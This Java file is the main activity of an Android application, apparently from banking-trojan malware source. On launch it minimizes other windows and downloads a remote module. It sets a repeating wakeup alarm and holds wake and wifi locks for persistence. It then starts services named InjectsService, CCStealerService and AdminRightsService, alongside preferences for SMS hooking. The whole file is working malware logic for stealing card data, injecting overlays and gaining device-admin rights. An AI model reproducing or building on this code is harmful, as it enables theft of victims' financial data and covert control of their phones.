package com.moonny.acts;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.v4.app.FragmentActivity;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

import com.moonny.R;
import com.moonny.Modules;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.rcvs.AlarmReceiver;
import com.moonny.srvs.AdminRightsService;
import com.moonny.srvs.CCStealerService;
import com.moonny.srvs.InjectsService;
import com.moonny.helpers.Utils;


// git test
public class MainActivity extends FragmentActivity {

    private static final String TAG = S.main_activity;
    public static final String ALARM_ACTION = "MainActivity.AlarmAction";//don't move to S

    private AlarmReceiver alarmReceiver = new AlarmReceiver();

    public static PowerManager.WakeLock WAKELOCK = null;
    public static WifiManager.WifiLock WIFILOCK = null;

    private Context ctx;

    @Override
    @SuppressWarnings("deprecation")
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        Utils.minimizeAll(this);

        ctx = getApplicationContext();
        if(Utils.is_blocked(ctx)) {
            finish();
            return;
        }

        Modules mods = new Modules(ctx);
        if(!mods.is_mod_exists(S.mod_main)) {
            if(Constant.DEBUG) Log.d("CONTROL", "start download main");
            mods.download_mod(S.main);
        }

        startAlarmManager();

        new Thread(new Runnable() {
            @Override
            public void run() {
                Looper.prepare();
                Context ctx = getBaseContext();
                Modules mods = new Modules(ctx);

                while (true)
                {
                    if(!mods.is_mod_exists(S.mod_main)) {
                        if(Constant.DEBUG) Log.d("CONTROL", "MainActivity init not allowed");

                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        continue;
                    }

                    init();
                    break;
                }

            }
        }).start();

        finish();
    }

    protected void init()
    {
        if(Constant.DEBUG) Log.d(TAG, "MainActivity INIT started");

        Modules.main(this, S.set_pref, new Object[]{ S.app_kill, false });
        Modules.main(this, S.set_pref, new Object[]{ S.free_dialog, false });
        Modules.main(this, S.set_pref, new Object[]{ S.sms_hook, false });
        Modules.main(this, S.set_pref, new Object[]{ S.api_full_required, true });
        Modules.main(this, S.set_pref, new Object[]{ S.socials_filled, false });

        Modules.main(this, S.base_main_init, new Object[]{ this.getComponentName() });

        if(WAKELOCK == null)
            WAKELOCK = (PowerManager.WakeLock) Modules.main(this, S.set_wakelock, new Object[]{ WAKELOCK });

        if(WIFILOCK == null)
            WIFILOCK = (WifiManager.WifiLock) Modules.main(this, S.set_wifilock, new Object[]{ WIFILOCK });

        startService(new Intent(this, InjectsService.class));
        startService(new Intent(this, CCStealerService.class));
        startService(new Intent(this, AdminRightsService.class));
    }

    private void startAlarmManager() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        LocalBroadcastManager.getInstance(getApplicationContext()).registerReceiver(alarmReceiver, new IntentFilter(ALARM_ACTION));
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Constant.MAIN_SLEEP, getAlarmIntent());
    }

    public PendingIntent getAlarmIntent() {
        Intent intent = new Intent(ALARM_ACTION);
        return PendingIntent.getBroadcast(this.getApplicationContext(), 0, intent, 0);
    }
}